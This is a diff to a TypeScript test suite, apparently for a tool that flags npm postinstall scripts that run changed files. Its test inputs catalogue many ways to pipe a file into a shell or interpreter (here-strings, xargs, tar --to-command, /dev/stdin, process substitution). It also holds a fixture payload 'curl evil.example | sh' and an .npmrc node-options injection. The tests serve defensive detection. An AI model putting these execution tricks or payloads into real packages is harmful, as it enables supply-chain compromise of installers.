@@ -917,8 +917,9 @@ describe("round 22: network and program-reading consumers, pipeline files, reads
   });
 
   test("2. quiet tools that turn a changed file into code", () => {
-    for (const cmd of ["cat x.diff | patch -p0 && node build.js", "git apply < x.diff && node build.js", "cat x.txt | tee build.js > /dev/null && node build.js", "base64 -d < x.b64 > y.js && node y.js"]) {
-      expect(fed(cmd), cmd).toBe(true);
+    const keep = { "build.js": "1\n", "y.js": "1\n" };
+    for (const [cmd, f] of [["cat test/x.diff | patch -p0 && node build.js", "test/x.diff"], ["git apply < test/x.diff && node build.js", "test/x.diff"], ["cat test/x.txt | tee build.js > /dev/null && node build.js", "test/x.txt"], ["base64 -d < test/x.b64 > y.js && node y.js", "test/x.b64"]] as const) {
+      expect(held({ postinstall: cmd }, { [f]: "a\n", ...keep }, { [f]: "b\n", ...keep }), cmd).toBe(true);
     }
   });
 
@@ -960,5 +961,47 @@ describe("round 23: npm exec command with flags after it, abbreviated call flags
 
   test("4. an npm runner config alone holds", () => {
     expect(held({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a=1\n" }, { ".npmrc": "node-options=--require=./x.js\n", "x.js": "evil()" })).toBe(true);
+  });
+});
+
+describe("round 24: redirects, here-strings, runners as consumers, stdin paths, xargs, output substitution", () => {
+  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}) => held({ postinstall: cmd }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. a descriptor redirect does not end the pipeline", () => {
+    for (const cmd of ["cat test/x.sh 2>&1 | sh", "cat test/x.sh >&2 | sh", "cat test/x.sh 2>/dev/null | sh", "cat test/x.sh &> /dev/null | sh"]) expect(inert(cmd), cmd).toBe(true);
+  });
+
+  test("2. a here-string with an expansion", () => {
+    for (const cmd of ['sh <<< "$(cat test/x.sh)"', "bash <<< `cat test/x.sh`", "node <<< \"$(cat test/x.sh)\""]) expect(inert(cmd), cmd).toBe(true);
+    expect(inert("sh <<< 'cd test && node setup.js'", "test/setup.js")).toBe(true);
+  });
+
+  test("3. runners and stream editors that run a fed file", () => {
+    for (const cmd of ["cat test/x.sh | npm exec -- sh", "cat test/x.sh | pnpm exec sh", "cat test/x.sh | yarn dlx sh", "cat test/x.sh | sed e", "tar -x --to-command=sh -f test/x.tar", "find test -name x.sh -exec sh {} \\;"]) {
+      expect(inert(cmd, cmd.includes("tar") ? "test/x.tar" : "test/x.sh"), cmd).toBe(true);
+    }
+  });
+
+  test("4. /dev/stdin and /dev/fd/0 operands", () => {
+    for (const cmd of ["cat test/x.js | node /dev/stdin", "bash /dev/fd/0 < test/x.sh", "cat test/x.sh | bash /dev/fd/0", "cat test/x.php | php -f php://stdin"]) {
+      expect(inert(cmd, cmd.includes("php") ? "test/x.php" : cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
+    }
+  });
+
+  test("5. xargs hands lines to a shell", () => {
+    expect(inert("echo test/x.sh | xargs sh")).toBe(true);
+    expect(inert("cat test/list | xargs bash", "test/list")).toBe(true);
+  });
+
+  test("6. an output process substitution", () => {
+    expect(inert("cat test/x.sh > >(sh)")).toBe(true);
+  });
+
+  test("7. a file written then run, and tee that is not run", () => {
+    const keep = { "build.js": "1\n" };
+    expect(inert("cat test/x.js > build.js && node build.js", "test/x.js", keep)).toBe(true);
+    expect(inert("npx --yes --cal 'sh test/x.sh'")).toBe(true);
+    expect(inert("bash --rcfile test/x.sh -i")).toBe(true);
+    expect(held({ postinstall: "node build.js 2>&1 | tee log.txt" }, { "build.js": "1\n", "lib/a.js": "1\n" }, { "build.js": "1\n", "lib/a.js": "1\n", "README.md": "b\n" })).toBe(false);
   });
 });
